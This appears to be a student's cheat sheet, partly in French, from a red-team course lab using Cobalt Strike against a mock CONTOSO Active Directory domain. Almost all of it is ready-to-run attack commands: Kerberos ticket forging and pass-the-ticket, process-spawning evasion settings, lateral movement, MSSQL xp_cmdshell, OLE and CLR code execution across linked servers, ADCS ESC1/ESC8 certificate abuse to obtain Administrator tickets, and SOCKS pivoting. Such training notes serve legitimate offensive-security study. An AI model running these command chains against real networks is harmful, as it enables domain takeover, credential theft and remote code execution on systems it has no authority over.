# Misc

```
make_token CONTOSO\user FakePass

$ticket = "doIFo[...snip...]kNPTQ=="
[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\ticket.kirbi", [Convert]::FromBase64String($ticket))

kerberos_ticket_use C:\Users\Attacker\Desktop\ticket.kirbi
```
# Session Passing

## spawn

```
beacon> spawn x64 http
```

![](https://lwfiles.mycourse.app/66e95234fe489daea7060790-public/04726cd3879e34328049a74ba6ae7288.png)

## spawnas

```
cd C:\
spawnas CONTOSO\rsteel Passw0rd! tcp-local
```

![](https://lwfiles.mycourse.app/66e95234fe489daea7060790-public/81ff27d13c2bcb86edcb83e11818cf41.png)
# Spawnto

- **ppid** sets the parent PID for fork & run commands.
- **spawnto** changes the sacrificial process for fork & run commands.
```
spawnto x64 C:\Windows\System32\dllhost.exe
spawnto x64 "C:\Program Files (x86)\Microsoft\Edge\\Application\msedge.exe"
```

Commandes affectée par `spawnto` :
```
spawn
execute-assembly
powerpick
mimikatz
desktop
printscreen
keylogger
portscan
```

- ak-settings spawnto_x64 change le process sous lequel spawn les PE générés (exe, DLL, etc..)
```
ak-settings spawnto_x64 C:\Windows\System32\dllhost.exe
ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
```

Commandes affectée par `ak-settings spawnto_x64` :
```
jump
inject
elevate
```

**PATHs**
```
C:\Windows\System32\dllhost.exe
C:\Windows\System32\svchost.exe
C:\Windows\explorer.exe
"C:\Program Files (x86)\Microsoft\Edge\\Application\msedge.exe"
C:\Windows\System32\cmd.exe
C:\Windows\System32\notepad.exe
C:\Windows\System32\rundll32.exe
C:\Windows\System32\wermgr.exe
C:\Windows\System32\spoolsv.exe
C:\Windows\SysWOW64\werfault.exe
C:\Windows\System32\conhost.exe
C:\Windows\System32\msiexec.exe
```

---
# Mouvement lateral

```
ak-settings spawnto_x64 C:\Windows\System32\dllhost.exe
ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
jump scshell64 lon-ws-1 smb
```

---
# ShareWrite

```
shell copy C:\rto.txt \\lon-ws-1\C$\rto.txt

cd \\enc-fs-1\c$
pwd (confirm you're there)
upload C:\Users\Attacker\Desktop\rto.txt
```

Ou alors mouvement latéral sur la machine et écriture depuis CS avec File browser -> upload

> I'm always reaching the last host but cannot write to it even with cifs ticket. Can i get a hint in what to sudy again?
> "even with cifs ticket" doesn't make too much sense. What's important is the user that you're impersonating with that ticket. Not all tickets are equal.

---
# MSSQL
```
ldapsearch (&(samAccountType=805306368)(servicePrincipalName=MSSQLSvc*)) --attributes name,samAccountName,servicePrincipalName
portscan 10.10.120.0/23 1433 arp 1024
sql-1434udp 10.10.120.20
sql-info lon-db-1
sql-whoami lon-db-1
sql-query lon-db-1 "SELECT @@SERVERNAME"
sql-query lon-db-1 "SELECT name,value FROM sys.configurations WHERE name = 'xp_cmdshell'"
sql-enablexp lon-db-1
sql-xpcmd lon-db-1 "hostname && whoami"
sql-disablexp lon-db-1

sql-query lon-db-1 "SELECT name,value FROM sys.configurations WHERE name = 'Ole Automation Procedures'"
sql-enableole lon-db-1
sql-olecmd lon-db-1 "cmd /c calc"
sql-disableole lon-db-1

sql-query lon-db-1 "SELECT value FROM sys.configurations WHERE name = 'clr enabled'"
sql-enableclr lon-db-1
sql-clr lon-db-1 C:\Users\Attacker\source\repos\ClassLibrary1\bin\Release\ClassLibrary1.dll MyProcedure
sql-disableclr lon-db-1

sql-links lon-db-1
sql-query lon-db-1 "SELECT @@SERVERNAME" "" lon-db-2
sql-whoami lon-db-1 "" lon-db-2
sql-checkrpc lon-db-1
sql-enablerpc lon-db-1 lon-db-2
sql-clr lon-db-1 C:\Users\Attacker\source\repos\ClassLibrary1\bin\Release\ClassLibrary1.dll MyProcedure "" lon-db-2
```

---
# ADCS
```
execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe enum-cas --quiet
execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe enum-templates --filter-enabled --filter-vulnerable --hide-admins --quiet
```
## esc1
```
execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request --ca "lon-cs-1.contoso.com\CONTOSO Root CA" --template ESC1 --upn Administrator --quiet
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:Administrator /domain:CONTOSO.COM /certificate:BASE64 /enctype:aes256 /nowrap
```
## esc8
```
[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Users\Attacker\Desktop\LON-DC-1.pfx"))
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:Administrator /domain:CONTOSO.COM /certificate:BASE64 /enctype:aes256 /nowrap
krb_s4u /user:LON-DC-1$ /self /altservice:cifs/lon-dc-1.contoso.com /impersonateuser:Administrator /ticket:<TGT_base64> /nowrap
```

---
# TRUST
```
ldapsearch (objectClass=trustedDomain) --attributes trustDirection,trustPartner,trustAttributes,flatName,name,objectGUID
```

---
# APPLOCKER
```
Get-ChildItem 'HKLM:Software\Policies\Microsoft\Windows\SrpV2'
Get-ChildItem 'HKLM:Software\Policies\Microsoft\Windows\SrpV2\Exe'
$policy = Get-AppLockerPolicy -Effective
$policy.RuleCollections

ldapsearch (objectClass=groupPolicyContainer) --attributes displayName,gPCFileSysPath

ls \\contoso.com\SysVol\contoso.com\Policies\{8ECEE926-7FEE-48CD-9F51-493EB5AD95DC}\Machine

download \\contoso.com\SysVol\contoso.com\Policies\{8ECEE926-7FEE-48CD-9F51-493EB5AD95DC}\Machine\Registry.pol

Parse-PolFile -Path .\Desktop\Registry.pol
```

# Pivoting - SOCKS Proxies

## Socks
Start a SOCKS proxy.
```
socks 1080 socks5
```

## DNS
  
Add static DNS records for _lon-dc-1_ and _contoso.com_:
```
Add-Content -Path C:\Windows\System32\drivers\etc\hosts -Value "10.10.120.1 lon-dc-1 lon-dc-1.contoso.com contoso.com"
```

## Proxifier

### Proxy Server

Add the team server as a new proxy server:
1. **Profile > Proxy Servers**
2. Click **Add**.
3. Address: 10.0.0.5
4. Port: 1080
5. Protocol: **SOCKS Version 5**
6. Click **OK**.

> A box will appear asking if you want to use this proxy by default. Click **No**.

7. Click **OK** again.

> Another box will appear asking if you want to edit Proxification Rules. Click **Yes**.

### Proxification Rules

Add a new rule that will proxy any traffic from any application, on any port destined for the target network, through the team server.
1. Click **Add**.
2. Name: **Beacon**
3. Target hosts: 10.10.120.0/23
4. Action: **Proxy SOCKS5 10.0.0.5**
5. Click **OK**.
6. Click **OK** again.

## LDAP Service Ticket

1. From Terminal, run a new netonly PowerShell process.
```
runas /netonly /user:CONTOSO\rsteel powershell.exe
```
Password: `FakePass`

2. Use the user's TGT to request a service ticket for LDAP and pass it into the current session.
```
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:ldap/lon-dc-1 /ticket:[ENCODED TGT] /dc:lon-dc-1 /ptt
```

3. The native klist command won't work here, so verify the ticket using Rubeus.
```
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe klist
```

## Domain Enumeration

1. Use the native AD RSAT cmdlets to query the domain.
    1. `Get-ADComputer -Filter * -Server lon-dc-1`
    2. `Get-ADUser -Filter * -Server lon-dc-1`
    3. `Get-ADOrganizationalUnit -Filter * -Server lon-dc-1`